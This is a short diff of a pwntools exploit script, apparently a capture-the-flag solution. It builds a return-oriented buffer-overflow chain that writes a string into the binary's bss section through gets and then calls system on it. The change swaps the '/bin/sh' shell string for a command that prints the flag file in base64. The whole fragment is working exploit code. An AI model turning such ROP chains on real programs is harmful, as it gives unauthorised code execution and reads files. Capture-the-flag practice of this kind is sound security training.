@@ -15,7 +15,7 @@ gets_plt=elf.plt['gets']
 system_plt=elf.plt['system']
 payload=b'a'*0x28+p64(pop_rpi)+p64(bss_stage)+p64(gets_plt)+p64(main_addr)
 p.sendline(payload)
-p.sendline(b'/bin/sh\x00')
+p.sendline(b'base64<flag\x00')
 p.recv()
 payload2=b'a'*0x28+p64(pop_rpi)+p64(bss_stage)+p64(system_plt)
 p.sendline(payload2)
